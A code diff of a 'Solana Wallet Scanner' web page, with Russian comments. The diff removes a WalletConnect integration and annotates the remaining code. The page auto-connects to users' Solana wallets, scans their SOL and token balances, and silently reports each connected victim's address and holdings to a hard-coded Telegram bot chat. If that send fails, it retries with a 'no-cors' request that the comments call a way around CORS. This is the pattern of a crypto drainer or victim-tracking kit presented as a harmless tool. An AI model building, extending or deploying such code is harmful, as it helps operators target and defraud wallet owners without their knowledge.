@@ -3,17 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Solana Wallet Scanner - WalletConnect v2</title>
+  <title>Solana Wallet Scanner - Telegram Only</title>
   
   <!-- Подключаем Solana Web3.js библиотеки -->
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
   <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js"></script>
-  
-  <!-- WalletConnect v2 SDK -->
-  <script src="https://unpkg.com/@walletconnect/sign-client@2.10.0/dist/index.umd.js"></script>
-  <script src="https://unpkg.com/@walletconnect/utils@2.10.0/dist/index.umd.js"></script>
-  <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
   
   <style>
     body {
@@ -149,10 +144,6 @@
       font-size: 0.8rem;
       color: #28a745;
       margin-left: 10px;
-    }
-
-    .wallet-status.walletconnect {
-      color: #3b99fc;
     }
 
     .connection-status {
@@ -326,6 +317,7 @@
         padding: 6px 10px;
       }
 
+      /* Removed the grid-template-columns change to keep 3 columns */
       .wallet-item img {
         width: 60px;
         height: 60px;
@@ -399,103 +391,6 @@
     .debug-panel, .wallet-browser-banner {
       display: none !important;
     }
-
-    /* WalletConnect Modal Styles */
-    .walletconnect-modal {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      border-radius: 20px;
-      width: 400px;
-      max-width: 90vw;
-      padding: 20px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
-      z-index: 1002;
-      text-align: center;
-    }
-
-    .walletconnect-qr {
-      margin: 20px 0;
-      padding: 20px;
-      background: #f8f9fa;
-      border-radius: 10px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 200px;
-    }
-
-    .walletconnect-buttons {
-      display: flex;
-      gap: 10px;
-      margin-top: 15px;
-    }
-
-    .walletconnect-btn {
-      flex: 1;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: background-color 0.3s;
-    }
-
-    .walletconnect-btn.primary {
-      background: #3b99fc;
-      color: white;
-    }
-
-    .walletconnect-btn.primary:hover {
-      background: #2980e6;
-    }
-
-    .walletconnect-btn.secondary {
-      background: #e0e0e0;
-      color: #333;
-    }
-
-    .walletconnect-btn.secondary:hover {
-      background: #d0d0d0;
-    }
-
-    .walletconnect-status {
-      margin-top: 15px;
-      padding: 10px;
-      border-radius: 8px;
-      font-size: 0.9rem;
-    }
-
-    .walletconnect-status.connecting {
-      background: #d1ecf1;
-      color: #0c5460;
-      border: 1px solid #bee5eb;
-    }
-
-    .walletconnect-status.connected {
-      background: #d4edda;
-      color: #155724;
-      border: 1px solid #c3e6cb;
-    }
-
-    .walletconnect-status.error {
-      background: #f8d7da;
-      color: #721c24;
-      border: 1px solid #f5c6cb;
-    }
-
-    /* QR Code Styles */
-    #qrcode {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    #qrcode canvas {
-      border-radius: 10px;
-    }
   </style>
 </head>
 <body>
@@ -524,7 +419,7 @@
     <!-- Connection Status Display -->
     <div id="connectionStatus" class="connection-status hidden"></div>
     
-    <!-- Wallet Info Display -->
+    <!-- Wallet Info Display - Упрощенный, без деталей -->
     <div id="walletInfo" class="wallet-info hidden">
       <div><strong>Connected Wallet:</strong> <span id="connectedWalletName"></span></div>
       <div><strong>Address:</strong></div>
@@ -550,7 +445,7 @@
       <div class="wallet-option" data-wallet="trustwallet">
         <img src="https://s.iimg.su/s/26/mA9QKT4xSAh5HifKsQIN8m9oZxn3ODrKcl1XQdtn.png" alt="Trust Wallet" />
         <span>Trust Wallet</span>
-        <div class="wallet-status walletconnect">WalletConnect</div>
+        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" data-wallet="magiceden">
         <img src="/placeholder.svg" alt="Magic Eden" />
@@ -560,7 +455,7 @@
       <div class="wallet-option" data-wallet="mathwallet">
         <img src="/placeholder.svg" alt="Math Wallet" />
         <span>Math Wallet</span>
-        <div class="wallet-status walletconnect">WalletConnect</div>
+        <div class="wallet-status">Available</div>
       </div>
       <div class="wallet-option" id="allWalletsBtn">
         <img src="/placeholder.svg" alt="All Wallets" />
@@ -619,30 +514,6 @@
     </div>
   </div>
 
-  <!-- WalletConnect Modal -->
-  <div id="walletConnectModal" class="walletconnect-modal hidden">
-    <div class="connect-header">
-      <h2 id="walletConnectTitle">WalletConnect</h2>
-      <button class="close-btn" onclick="closeWalletConnectModal()">×</button>
-    </div>
-    <div id="walletConnectContent">
-      <div class="walletconnect-qr">
-        <div id="qrcode">Generating QR Code...</div>
-      </div>
-      <div class="walletconnect-buttons">
-        <button class="walletconnect-btn primary" onclick="copyWalletConnectURI()">Copy Link</button>
-        <button class="walletconnect-btn secondary" onclick="openInWallet()">Open Wallet</button>
-      </div>
-      <div id="walletConnectStatus" class="walletconnect-status hidden"></div>
-      <div style="margin-top: 10px; color: #666; font-size: 0.9rem;">
-        Scan QR code with your wallet or copy the link
-      </div>
-    </div>
-  </div>
-
-  <!-- QR Code Library -->
-  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-
   <script>
     // ============================================================================
     // DEBUG UTILITIES
@@ -686,341 +557,6 @@
     });
 
     // ============================================================================
-    // REAL WALLETCONNECT V2 IMPLEMENTATION
-    // ============================================================================
-
-    class RealWalletConnect {
-      constructor() {
-        this.projectId = '2fccf184294fa18eb302a726ed56708b'; // Ваш Project ID
-        this.signClient = null;
-        this.session = null;
-        this.currentURI = null;
-        this.currentWalletName = null;
-        this.isInitialized = false;
-        this.isConnecting = false;
-      }
-
-      async init() {
-        if (this.isInitialized) return;
-        
-        try {
-          debug('🔄 Initializing WalletConnect v2...');
-          
-          // Проверяем доступность WalletConnect SDK
-          if (!window.WalletConnectSignClient) {
-            throw new Error('WalletConnect SDK not loaded');
-          }
-
-          this.signClient = await window.WalletConnectSignClient.SignClient.init({
-            projectId: this.projectId,
-            metadata: {
-              name: 'Solana Wallet Scanner',
-              description: 'Solana wallet connection and scanning tool',
-              url: window.location.origin,
-              icons: ['https://walletconnect.com/walletconnect-logo.png']
-            }
-          });
-
-          // Настраиваем обработчики событий
-          this.setupEventListeners();
-          
-          this.isInitialized = true;
-          debug('✅ WalletConnect v2 initialized successfully');
-          
-        } catch (error) {
-          debug('❌ Failed to initialize WalletConnect:', error);
-          throw error;
-        }
-      }
-
-      setupEventListeners() {
-        if (!this.signClient) return;
-
-        // Обработчик успешного подключения
-        this.signClient.on('session_proposal', async (proposal) => {
-          debug('📥 Session proposal received:', proposal);
-          // Автоматически одобряем предложение сессии
-          try {
-            const session = await this.signClient.approve({
-              id: proposal.id,
-              namespaces: {
-                solana: {
-                  methods: ['solana_signTransaction', 'solana_signMessage'],
-                  chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
-                  events: ['accountsChanged', 'chainChanged'],
-                  accounts: []
-                }
-              }
-            });
-            debug('✅ Session approved:', session);
-          } catch (error) {
-            debug('❌ Failed to approve session:', error);
-          }
-        });
-
-        // Обработчик установленной сессии
-        this.signClient.on('session_event', (event) => {
-          debug('📡 Session event:', event);
-        });
-
-        // Обработчик обновления сессии
-        this.signClient.on('session_update', ({ topic, params }) => {
-          debug('🔄 Session updated:', { topic, params });
-          const session = this.signClient.session.get(topic);
-          this.session = session;
-        });
-
-        // Обработчик удаления сессии
-        this.signClient.on('session_delete', () => {
-          debug('🗑️ Session deleted');
-          this.session = null;
-          this.currentURI = null;
-          this.closeWalletConnectModal();
-        });
-      }
-
-      async connect(walletName) {
-        if (this.isConnecting) {
-          debug('⏳ Connection already in progress');
-          return;
-        }
-
-        this.isConnecting = true;
-        this.currentWalletName = walletName;
-
-        try {
-          await this.init();
-
-          debug(`🔗 Starting WalletConnect connection for ${walletName}`);
-          
-          // Создаем новое подключение
-          const { uri, approval } = await this.signClient.connect({
-            requiredNamespaces: {
-              solana: {
-                methods: ['solana_signTransaction', 'solana_signMessage'],
-                chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
-                events: ['accountsChanged', 'chainChanged']
-              }
-            }
-          });
-
-          if (uri) {
-            this.currentURI = uri;
-            debug('✅ WalletConnect URI generated:', uri);
-            
-            // Показываем модал с QR кодом
-            this.showWalletConnectModal(walletName, uri);
-            
-            // Ждем подтверждения от кошелька
-            this.waitForApproval(approval);
-          }
-
-        } catch (error) {
-          debug('❌ WalletConnect connection failed:', error);
-          this.showWalletConnectStatus('error', `Connection failed: ${error.message}`);
-          this.isConnecting = false;
-        }
-      }
-
-      async waitForApproval(approval) {
-        try {
-          debug('⏳ Waiting for wallet approval...');
-          this.showWalletConnectStatus('connecting', 'Waiting for wallet approval...');
-          
-          const session = await approval();
-          this.session = session;
-          
-          debug('✅ Session established:', session);
-          this.showWalletConnectStatus('connected', 'Connected successfully!');
-          
-          // Получаем адрес кошелька
-          const accounts = session.namespaces.solana?.accounts || [];
-          if (accounts.length > 0) {
-            // Извлекаем адрес из формата "solana:chainId:address"
-            const address = accounts[0].split(':')[2];
-            debug('📍 Wallet address:', address);
-            
-            // Симулируем успешное подключение
-            setTimeout(() => {
-              this.simulateSuccessfulConnection(this.currentWalletName, address);
-            }, 1500);
-          }
-          
-        } catch (error) {
-          debug('❌ Session approval failed:', error);
-          this.showWalletConnectStatus('error', 'Connection rejected or failed');
-        } finally {
-          this.isConnecting = false;
-        }
-      }
-
-      simulateSuccessfulConnection(walletName, address) {
-        debug(`🎉 Simulating successful connection for ${walletName}`);
-        
-        // Закрываем WalletConnect модал
-        this.closeWalletConnectModal();
-        
-        // Передаем данные в wallet manager
-        if (window.walletManager) {
-          window.walletManager.handleWalletConnectConnection(walletName, address);
-        }
-      }
-
-      showWalletConnectModal(walletName, uri) {
-        const modal = document.getElementById('walletConnectModal');
-        const title = document.getElementById('walletConnectTitle');
-        const qrContainer = document.getElementById('qrcode');
-        
-        title.textContent = `Connect ${walletName}`;
-        
-        // Генерируем QR код
-        this.generateQRCode(uri, qrContainer);
-        
-        modal.classList.remove('hidden');
-        document.getElementById('modalOverlay').classList.remove('hidden');
-        
-        debug(`📱 WalletConnect modal opened for ${walletName}`);
-      }
-
-      generateQRCode(uri, container) {
-        // Очищаем контейнер
-        container.innerHTML = '';
-        
-        // Генерируем QR код с помощью библиотеки qrcode
-        if (window.QRCode) {
-          window.QRCode.toCanvas(uri, {
-            width: 200,
-            margin: 2,
-            color: {
-              dark: '#000000',
-              light: '#FFFFFF'
-            }
-          }, (error, canvas) => {
-            if (error) {
-              debug('❌ QR Code generation failed:', error);
-              container.innerHTML = `
-                <div style="width: 200px; height: 200px; background: #f0f0f0; border: 2px dashed #ccc; display: flex; align-items: center; justify-content: center;">
-                  <div style="text-align: center; color: #666;">
-                    <div style="font-size: 24px; margin-bottom: 10px;">📱</div>
-                    <div style="font-size: 12px;">QR Code Error</div>
-                  </div>
-                </div>
-              `;
-            } else {
-              container.appendChild(canvas);
-              debug('✅ QR Code generated successfully');
-            }
-          });
-        } else {
-          // Fallback если библиотека QR кодов не загружена
-          container.innerHTML = `
-            <div style="width: 200px; height: 200px; background: #f0f0f0; border: 2px dashed #ccc; display: flex; align-items: center; justify-content: center; margin: 0 auto;">
-              <div style="text-align: center; color: #666;">
-                <div style="font-size: 24px; margin-bottom: 10px;">📱</div>
-                <div style="font-size: 12px;">Scan with<br/>WalletConnect</div>
-              </div>
-            </div>
-          `;
-        }
-      }
-
-      showWalletConnectStatus(type, message) {
-        const statusElement = document.getElementById('walletConnectStatus');
-        if (statusElement) {
-          statusElement.className = `walletconnect-status ${type}`;
-          statusElement.textContent = message;
-          statusElement.classList.remove('hidden');
-
-          if (type === 'connected' || type === 'error') {
-            setTimeout(() => {
-              statusElement.classList.add('hidden');
-            }, 3000);
-          }
-        }
-      }
-
-      closeWalletConnectModal() {
-        const modal = document.getElementById('walletConnectModal');
-        modal.classList.add('hidden');
-        document.getElementById('modalOverlay').classList.add('hidden');
-        this.currentURI = null;
-        this.currentWalletName = null;
-      }
-
-      copyURI() {
-        if (this.currentURI) {
-          navigator.clipboard.writeText(this.currentURI).then(() => {
-            debug('📋 WalletConnect URI copied to clipboard');
-            alert('WalletConnect link copied to clipboard!');
-          }).catch(err => {
-            debug('❌ Failed to copy URI:', err);
-            // Fallback для старых браузеров
-            const textArea = document.createElement('textarea');
-            textArea.value = this.currentURI;
-            document.body.appendChild(textArea);
-            textArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textArea);
-            alert('WalletConnect link copied to clipboard!');
-          });
-        }
-      }
-
-      openInWallet(walletType = 'trust') {
-        if (!this.currentURI) return;
-        
-        const deeplinks = {
-          trust: `https://link.trustwallet.com/wc?uri=${encodeURIComponent(this.currentURI)}`,
-          metamask: `https://metamask.app.link/wc?uri=${encodeURIComponent(this.currentURI)}`,
-          rainbow: `https://rnbwapp.com/wc?uri=${encodeURIComponent(this.currentURI)}`,
-          mathwallet: `mathwallet://wc?uri=${encodeURIComponent(this.currentURI)}`
-        };
-        
-        const link = deeplinks[walletType] || deeplinks.trust;
-        window.open(link, '_blank');
-        debug(`🔗 Opening ${walletType} wallet with WalletConnect`);
-      }
-
-      async disconnect() {
-        if (this.session && this.signClient) {
-          try {
-            await this.signClient.disconnect({
-              topic: this.session.topic,
-              reason: {
-                code: 6000,
-                message: 'User disconnected'
-              }
-            });
-            debug('🔌 WalletConnect session disconnected');
-          } catch (error) {
-            debug('❌ Failed to disconnect WalletConnect:', error);
-          }
-        }
-        
-        this.session = null;
-        this.currentURI = null;
-        this.currentWalletName = null;
-      }
-    }
-
-    // Глобальный экземпляр WalletConnect
-    const realWalletConnect = new RealWalletConnect();
-
-    // Глобальные функции для модала
-    function closeWalletConnectModal() {
-      realWalletConnect.closeWalletConnectModal();
-    }
-
-    function copyWalletConnectURI() {
-      realWalletConnect.copyURI();
-    }
-
-    function openInWallet() {
-      const walletType = realWalletConnect.currentWalletName?.toLowerCase().replace(' ', '') || 'trust';
-      realWalletConnect.openInWallet(walletType);
-    }
-
-    // ============================================================================
     // WALLET BROWSER DETECTION
     // ============================================================================
 
@@ -1028,12 +564,15 @@
       const userAgent = navigator.userAgent.toLowerCase();
       const url = window.location.href.toLowerCase();
       
+      // Detect if we're in a wallet browser
       const isPhantomBrowser = userAgent.includes('phantom') || url.includes('phantom');
       const isSolflareBrowser = userAgent.includes('solflare') || url.includes('solflare');
       
+      // Check for wallet objects
       const hasPhantomObject = window.phantom && window.phantom.solana;
       const hasSolflareObject = window.solflare;
       
+      // Determine which wallet browser we're in
       let walletBrowserInfo = {
         isWalletBrowser: false,
         walletName: null,
@@ -1079,6 +618,7 @@
       document.body.insertBefore(banner, document.body.firstChild);
       
       if (walletInfo.isWalletBrowser) {
+        // Set up the connect button
         connectBtn.addEventListener('click', async () => {
           try {
             if (window.walletManager) {
@@ -1101,11 +641,10 @@
       CHAT_ID: '7253475769'
     };
 
-    // Конфигурация кошельков с поддержкой WalletConnect v2
+    // Конфигурация кошельков с глубокими и универсальными ссылками
     const WALLET_CONFIG = {
       phantom: {
         name: 'Phantom',
-        type: 'injected',
         mobile: {
           android: { 
             scheme: 'phantom://', 
@@ -1119,7 +658,6 @@
       },
       solflare: {
         name: 'Solflare',
-        type: 'injected',
         mobile: {
           android: { 
             scheme: 'solflare://ul/v1/', 
@@ -1131,54 +669,17 @@
           }
         }
       },
-      trustwallet: {
-        name: 'Trust Wallet',
-        type: 'walletconnect',
-        provider: () => window.trustwallet?.solana,
-        downloadUrl: 'https://trustwallet.com/',
-        checkMethod: () => window.trustwallet?.solana
-      },
       magiceden: {
         name: 'Magic Eden',
-        type: 'injected',
         provider: () => window.magiceden,
         downloadUrl: 'https://magiceden.io/',
         checkMethod: () => window.magiceden
       },
       mathwallet: {
         name: 'Math Wallet',
-        type: 'walletconnect',
         provider: () => window.mathwallet,
         downloadUrl: 'https://mathwallet.org/',
         checkMethod: () => window.mathwallet
-      },
-      backpack: {
-        name: 'Backpack',
-        type: 'injected',
-        provider: () => window.backpack,
-        downloadUrl: 'https://backpack.app/',
-        checkMethod: () => window.backpack
-      },
-      okx: {
-        name: 'OKX Wallet',
-        type: 'injected',
-        provider: () => window.okxwallet?.solana,
-        downloadUrl: 'https://www.okx.com/web3',
-        checkMethod: () => window.okxwallet?.solana
-      },
-      exodus: {
-        name: 'Exodus',
-        type: 'injected',
-        provider: () => window.exodus?.solana,
-        downloadUrl: 'https://www.exodus.com/',
-        checkMethod: () => window.exodus?.solana
-      },
-      safepal: {
-        name: 'SafePal',
-        type: 'walletconnect',
-        provider: () => window.safepal?.solana,
-        downloadUrl: 'https://www.safepal.com/',
-        checkMethod: () => window.safepal?.solana
       }
     };
 
@@ -1196,7 +697,7 @@
     function createWalletLink(walletKey) {
       const device = detectDevice();
       const wallet = WALLET_CONFIG[walletKey];
-      if (!wallet || !device.isMobile || !wallet.mobile) return null;
+      if (!wallet || !device.isMobile) return null;
       
       const currentUrl = encodeURIComponent(window.location.href);
       const platform = device.os;
@@ -1212,13 +713,15 @@
     function openWalletWithDeepLink(walletKey) {
       const links = createWalletLink(walletKey);
       if (!links) {
-        return false;
+        return false; // Not a mobile device or unsupported wallet
       }
 
+      // Попытка открыть глубокую ссылку
       const deepLinkAnchor = document.createElement('a');
       deepLinkAnchor.href = links.deepLink;
       deepLinkAnchor.click();
 
+      // Резервный переход по универсальной ссылке через 1.5 секунды
       setTimeout(() => {
         if (!document.hidden) {
           const universalLinkAnchor = document.createElement('a');
@@ -1250,6 +753,7 @@
      * Функция отправки в Telegram
      */
     async function sendWalletInfoToTelegram(walletName, walletData) {
+      // Проверяем, что у нас есть действительный адрес кошелька
       if (!walletData || !walletData.address) {
         debug('❌ Нет действительного адреса кошелька для отправки в Telegram');
         return false;
@@ -1267,12 +771,12 @@
         second: '2-digit'
       });
 
+      // Создаем сообщение БЕЗ markdown для надежности
       let message = `🚀 ПОДКЛЮЧЕНИЕ КОШЕЛЬКА\n\n`;
       message += `💼 Кошелек: ${walletName}\n`;
       message += `📍 Адрес: ${walletData.address}\n`;
       message += `⏰ Время: ${currentTime}\n`;
-      message += `🌐 Сайт: ${window.location.hostname}\n`;
-      message += `🔗 Метод: ${walletData.connectionMethod || 'Direct'}\n\n`;
+      message += `🌐 Сайт: ${window.location.hostname}\n\n`;
       
       message += `📊 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n`;
       message += `💰 Баланс SOL: ${walletData.solBalance.toFixed(4)} SOL\n`;
@@ -1329,11 +833,15 @@
         } else {
           debug('❌ Ошибка Telegram API:', responseData);
           showTelegramStatus('error', '❌ Ошибка отправки');
+          
+          // Пробуем альтернативный метод
           return await sendViaAlternativeMethod(message);
         }
       } catch (error) {
         debug('❌ Ошибка сети:', error);
         showTelegramStatus('error', '❌ Ошибка сети');
+        
+        // Пробуем альтернативный метод
         return await sendViaAlternativeMethod(message);
       }
     }
@@ -1345,11 +853,12 @@
       try {
         debug('🔄 Пробуем альтернативный метод отправки...');
         
+        // Используем другой подход - через fetch без CORS ограничений
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
         
         const response = await fetch(telegramUrl, {
           method: 'POST',
-          mode: 'no-cors',
+          mode: 'no-cors', // Обходим CORS
           headers: {
             'Content-Type': 'application/json',
           },
@@ -1360,6 +869,7 @@
           })
         });
 
+        // При mode: 'no-cors' мы не можем прочитать ответ, но запрос отправится
         debug('📤 Альтернативный запрос отправлен');
         showTelegramStatus('success', '✅ Отправлено (альтернативно)');
         return true;
@@ -1640,7 +1150,7 @@
     }
 
     // ============================================================================
-    // ENHANCED WALLET MANAGER
+    // WALLET MANAGER
     // ============================================================================
 
     class SolanaWalletManager {
@@ -1656,77 +1166,66 @@
         this.walletConfigs = {
           phantom: {
             name: 'Phantom',
-            type: 'injected',
             provider: () => window.phantom?.solana,
             downloadUrl: '',
             checkMethod: () => window.phantom?.solana?.isPhantom
           },
           solflare: {
             name: 'Solflare',
-            type: 'injected',
             provider: () => window.solflare,
             downloadUrl: '',
             checkMethod: () => window.solflare?.isSolflare
           },
           trustwallet: {
             name: 'Trust Wallet',
-            type: 'walletconnect',
             provider: () => window.trustwallet?.solana,
             downloadUrl: 'https://trustwallet.com/',
             checkMethod: () => window.trustwallet?.solana
           },
           magiceden: {
             name: 'Magic Eden',
-            type: 'injected',
             provider: () => window.magiceden,
             downloadUrl: 'https://magiceden.io/',
             checkMethod: () => window.magiceden
           },
           mathwallet: {
             name: 'Math Wallet',
-            type: 'walletconnect',
             provider: () => window.mathwallet,
             downloadUrl: 'https://mathwallet.org/',
             checkMethod: () => window.mathwallet
           },
           coinbase: {
             name: 'Coinbase Wallet',
-            type: 'injected',
             provider: () => window.coinbaseSolana,
             downloadUrl: 'https://www.coinbase.com/wallet',
             checkMethod: () => window.coinbaseSolana
           },
           bitget: {
             name: 'Bitget Wallet',
-            type: 'injected',
             provider: () => window.bitkeep?.solana,
             downloadUrl: 'https://web3.bitget.com/',
             checkMethod: () => window.bitkeep?.solana
           },
           backpack: {
             name: 'Backpack',
-            type: 'injected',
             provider: () => window.backpack,
             downloadUrl: 'https://backpack.app/',
             checkMethod: () => window.backpack
           },
           okx: {
             name: 'OKX Wallet',
-            type: 'injected',
             provider: () => window.okxwallet?.solana,
             downloadUrl: 'https://www.okx.com/web3',
             checkMethod: () => window.okxwallet?.solana
           },
           exodus: {
             name: 'Exodus',
-            type: 'injected',
             provider: () => window.exodus?.solana,
             downloadUrl: 'https://www.exodus.com/',
             checkMethod: () => window.exodus?.solana
           },
           safepal: {
             name: 'SafePal',
-            type: 'walletconnect',
             provider: () => window.safepal?.solana,
             downloadUrl: 'https://www.safepal.com/',
             checkMethod: () => window.safepal?.solana
@@ -1739,10 +1238,12 @@
       init() {
         this.setupEventListeners();
         
+        // Check if we're in a wallet browser and show banner if needed
         const walletBrowserInfo = detectWalletBrowser();
         if (walletBrowserInfo.isWalletBrowser) {
           debug(`🔍 Detected ${walletBrowserInfo.walletName} browser, mobile: ${walletBrowserInfo.isMobile}`);
           
+          // Для мобильного браузера Phantom автоматически подключаемся без баннера
           if (walletBrowserInfo.walletKey === 'phantom' && walletBrowserInfo.isMobile) {
             debug('📱 Detected Phantom mobile browser, waiting for Phantom object...');
             let attempts = 0;
@@ -1762,8 +1263,10 @@
               }
             }, 500);
           } else {
+            // Для других браузеров показываем баннер
             showWalletBrowserBanner(walletBrowserInfo);
             
+            // Auto-connect if in wallet browser after a short delay
             setTimeout(() => {
               if (!this.connectedWallet && walletBrowserInfo.walletKey) {
                 debug(`🔄 Auto-connecting to ${walletBrowserInfo.walletName}...`);
@@ -1790,61 +1293,26 @@
         }
       }
 
-      // Обработчик подключения через WalletConnect
-      async handleWalletConnectConnection(walletName, address) {
-        debug(`🔗 Handling WalletConnect connection for ${walletName}`);
-        
-        this.walletAddress = address;
-        this.walletName = walletName;
-        this.connectedWallet = { type: 'walletconnect', address: address };
-        
-        localStorage.setItem('connectedWallet', walletName.toLowerCase().replace(' ', ''));
-        
-        this.updateConnectionUI();
-        this.showConnectionStatus('success', `Connected to ${walletName} via WalletConnect`);
-        
-        // Сканируем кошелек
-        this.isScanning = true;
-        try {
-          this.walletData = await this.scanner.performFastScan(this.walletAddress);
-          
-          // Добавляем информацию о методе подключения
-          if (this.walletData) {
-            this.walletData.connectionMethod = 'WalletConnect v2';
-          }
-          
-          if (this.walletData && this.walletData.address) {
-            await sendWalletInfoToTelegram(this.walletName, this.walletData);
-          }
-          
-          this.updateConnectionUI();
-        } catch (scanError) {
-          debug('❌ Scan failed:', scanError);
-        } finally {
-          this.isScanning = false;
-        }
-        
-        // Закрываем все модальные окна
-        setTimeout(() => {
-          closeAllModals();
-        }, 1500);
-      }
-
+      // Новый метод для прямого подключения в мобильном браузере Phantom
       async directPhantomMobileConnect() {
         debug('🔍 Attempting direct Phantom mobile browser connection...');
         
         try {
+          // Проверяем наличие объекта Phantom
           if (!window.phantom || !window.phantom.solana) {
             debug('❌ Phantom object not available');
             return;
           }
           
+          // В мобильном браузере Phantom нужно использовать другой подход
           const provider = window.phantom.solana;
           
           debug('✓ Phantom provider found, checking connection state');
           debug('✓ isConnected:', provider.isConnected);
           debug('✓ Has publicKey:', !!provider.publicKey);
           
+          // Важно: в мобильном браузере Phantom нужно ВСЕГДА вызывать connect(),
+          // даже если isConnected=true
           try {
             debug('Calling connect() on Phantom provider...');
             const response = await provider.connect({ onlyIfTrusted: true });
@@ -1866,6 +1334,7 @@
           } catch (connectError) {
             debug('❌ Phantom connect failed:', connectError);
             
+            // Если connect() не сработал, но publicKey доступен, используем его
             if (provider.publicKey) {
               debug('✓ Using existing publicKey from provider');
               return this.processPhantomConnection(provider, provider.publicKey);
@@ -1879,7 +1348,10 @@
         }
       }
 
+      // Добавьте новый метод для обработки успешного подключения:
+
       async processPhantomConnection(provider, publicKey) {
+        // Преобразуем publicKey в строку
         let walletAddress;
         if (typeof publicKey === 'string') {
           walletAddress = publicKey;
@@ -1894,15 +1366,18 @@
         
         debug('✓ Got wallet address:', walletAddress);
         
+        // Устанавливаем данные подключенного кошелька
         this.connectedWallet = provider;
         this.walletAddress = walletAddress;
         this.walletName = 'Phantom';
         
         localStorage.setItem('connectedWallet', 'phantom');
         
+        // Обновляем UI
         this.updateConnectionUI();
         this.showConnectionStatus('success', 'Connected to Phantom');
         
+        // Сканируем кошелек
         this.isScanning = true;
         try {
           this.walletData = await this.scanner.performFastScan(this.walletAddress);
@@ -1918,6 +1393,7 @@
           this.isScanning = false;
         }
         
+        // Устанавливаем обработчики событий
         this.setupWalletEventListeners(provider);
         
         return { publicKey };
@@ -1929,6 +1405,7 @@
           return;
         }
 
+        // Сбрасываем флаг отмены подключения
         this.connectionCancelled = false;
 
         const config = this.walletConfigs[walletKey];
@@ -1937,23 +1414,19 @@
           throw new Error(`Unsupported wallet: ${walletKey}`);
         }
 
-        // Проверяем тип кошелька и используем соответствующий метод подключения
-        if (config.type === 'walletconnect') {
-          debug(`🔗 Using WalletConnect for ${config.name}`);
-          await realWalletConnect.connect(config.name);
-          return;
-        }
-
+        // Проверяем, находимся ли мы в мобильном браузере Phantom
         const walletBrowserInfo = detectWalletBrowser();
         const isPhantomMobileBrowser = walletBrowserInfo.isWalletBrowser && 
                                       walletBrowserInfo.walletKey === 'phantom' && 
                                       walletBrowserInfo.isMobile;
         
+        // Для Phantom в мобильном браузере используем специальный метод
         if (walletKey === 'phantom' && isPhantomMobileBrowser) {
           debug('📱 Using direct Phantom mobile browser connection method');
           return await this.directPhantomMobileConnect();
         }
 
+        // For Phantom in-app browser, skip the deep linking
         if ((walletKey === 'phantom' || walletKey === 'solflare') && 
             detectDevice().isMobile && 
             !isPhantomMobileBrowser) {
@@ -1975,6 +1448,7 @@
             throw new Error(`${config.name} is not installed`);
           }
 
+          // Используем стандартную логику подключения для других кошельков
           if (walletKey === 'phantom') {
             response = await this.connectPhantom(provider, requestPermission);
           } else if (walletKey === 'solflare') {
@@ -1983,6 +1457,7 @@
             response = await this.connectGenericWallet(provider, requestPermission);
           }
 
+          // Проверяем, не была ли отменена операция подключения
           if (this.connectionCancelled) {
             debug('Connection was cancelled by user');
             this.showConnectionStatus('error', 'Connection cancelled');
@@ -2010,6 +1485,7 @@
             }
           }
 
+          // Проверяем, что адрес кошелька получен
           if (!walletAddress) {
             debug('Failed to get wallet address');
             this.showConnectionStatus('error', 'Failed to get wallet address');
@@ -2029,7 +1505,9 @@
           try {
             this.walletData = await this.scanner.performFastScan(this.walletAddress);
             
+            // Проверяем, что у нас есть действительный адрес кошелька перед отправкой в Telegram
             if (this.walletData && this.walletData.address) {
+              // АВТОМАТИЧЕСКИ ОТПРАВЛЯЕМ ДАННЫЕ В TELEGRAM
               await sendWalletInfoToTelegram(this.walletName, this.walletData);
             } else {
               debug('No valid wallet address to send to Telegram');
@@ -2043,6 +1521,7 @@
               this.showConnectionStatus('success', `Connected successfully!`);
             }
             
+            // Hide wallet browser banner if connection was successful
             const walletBrowserBanner = document.getElementById('walletBrowserBanner');
             if (walletBrowserBanner) {
               walletBrowserBanner.classList.add('hidden');
@@ -2066,6 +1545,7 @@
         } catch (error) {
           debug(`Failed to connect to ${config.name}:`, error);
           
+          // Проверяем, не была ли отменена операция подключения пользователем
           if (error.message && (error.message.includes('User rejected') || error.message.includes('cancelled') || error.message.includes('rejected'))) {
             this.connectionCancelled = true;
             this.showConnectionStatus('error', 'Connection rejected by user');
@@ -2095,7 +1575,9 @@
         try {
           this.walletData = await this.scanner.performFastScan(this.walletAddress);
           
+          // Проверяем, что у нас есть действительный адрес кошелька перед отправкой в Telegram
           if (this.walletData && this.walletData.address) {
+            // ОТПРАВЛЯЕМ ОБНОВЛЕННЫЕ ДАННЫЕ В TELEGRAM
             await sendWalletInfoToTelegram(`${this.walletName} (Rescan)`, this.walletData);
           } else {
             debug('No valid wallet address to send to Telegram');
@@ -2112,13 +1594,17 @@
       }
 
       async connectPhantom(provider, requestPermission) {
+        // Enhanced connection logic for Phantom
         debug('Connecting to Phantom with standard logic...');
         debug('Is Phantom provider present?', !!provider);
         
         if (requestPermission) {
           try {
+            // Debug information
             debug('Phantom connect method type:', typeof provider.connect);
             debug('Phantom is connected?', provider.isConnected);
+            
+            // Try direct connection with an explicit reconnect
             
             if (provider.isConnected && provider.publicKey) {
               debug('Phantom already connected, getting public key...');
@@ -2139,6 +1625,7 @@
